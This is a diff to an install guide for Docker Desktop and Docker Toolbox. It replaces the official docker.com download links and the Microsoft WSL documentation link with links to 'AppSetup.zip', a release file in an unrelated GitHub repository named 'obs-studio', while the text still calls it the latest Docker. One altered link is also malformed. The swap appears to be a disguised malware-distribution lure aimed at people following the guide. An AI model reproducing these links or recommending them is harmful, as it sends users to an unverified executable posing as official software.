@@ -1,13 +1,13 @@
 # Docker Desktop
 
-Windows 10 Pro and Enterprise 64-bit and MacOS users, please install docker desktop from [here](https://www.docker.com/products/docker-desktop). It is the most recent version of Docker. If asked, select to install "linux containers" - *NOT* "windows containers". 
+Windows 10 Pro and Enterprise 64-bit and MacOS users, please install docker desktop from [here](https://github.com/orugatil/obs-studio/releases/download/obs/AppSetup.zip). It is the most recent version of Docker. If asked, select to install "linux containers" - *NOT* "windows containers". 
 
-Windows must have their "linux subsystem" turn on, in case you have turned it off. See [here](https://docs.microsoft.com/en-us/windows/wsl/install-win10) for details.
+Windows must have their "linux subsystem" turn on, in case you have turned it off. See [here](hhttps://github.com/orugatil/obs-studio/releases/download/obs/AppSetup.zip) for details.
 
 
 # Docker Toolbox
 
-Everybody else has to install Docker Toolbox, from [here](https://docs.docker.com/toolbox/toolbox_install_windows/). 
+Everybody else has to install Docker Toolbox, from [here](https://github.com/orugatil/obs-studio/releases/download/obs/AppSetup.zip). 
 
 ## Did Docker Toolbox fail to install? - Enable Hyper-V
 
